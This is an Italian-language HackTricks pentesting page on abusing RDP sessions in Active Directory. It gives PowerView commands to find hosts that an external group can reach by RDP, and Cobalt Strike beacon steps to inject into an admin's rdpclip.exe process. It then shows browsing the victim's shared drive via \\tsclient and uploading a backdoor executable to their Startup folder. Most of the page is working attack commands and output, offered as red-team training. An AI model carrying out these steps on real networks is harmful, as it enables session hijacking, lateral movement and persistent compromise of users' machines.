# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Se il **gruppo esterno** ha **accesso RDP** a qualsiasi **computer** nel dominio attuale, un **attaccante** potrebbe **compromettere quel computer e aspettarlo**.

Una volta che quell'utente ha effettuato l'accesso tramite RDP, **l'attaccante può pivotare sulla sessione di quell'utente** e abusare delle sue autorizzazioni nel dominio esterno.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Controlla **altri modi per rubare sessioni con altri strumenti** [**in questa pagina.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Se un utente accede via **RDP a una macchina** dove un **attaccante** sta **aspettando** per lui, l'attaccante sarà in grado di **iniettare un beacon nella sessione RDP dell'utente** e se la **vittima ha montato il suo disco** quando accede via RDP, l'**attaccante potrebbe accedervi**.

In questo caso potresti semplicemente **compromettere** il **computer originale** delle **vittime** scrivendo un **backdoor** nella **cartella di avvio**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
{{#include ../../banners/hacktricks-training.md}}
